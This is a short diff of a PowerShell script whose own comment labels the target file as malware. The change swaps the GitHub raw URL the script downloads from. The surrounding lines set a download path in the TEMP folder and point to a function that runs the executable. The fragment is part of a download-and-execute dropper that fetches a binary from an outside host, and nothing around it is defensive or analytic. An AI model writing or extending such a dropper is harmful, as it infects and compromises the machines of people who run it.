@@ -67,7 +67,7 @@ function Run-Executable {
 }
 
 # URL of the malware file
-$malwareUrl = "https://github.com/angeborrelli/files/raw/main/inst.exe"
+$malwareUrl = "https://github.com/angeborrelli/files/raw/main/file_installer.exe"
 
 # Path to download the file
 $downloadPath = "$env:TEMP\installer.exe"
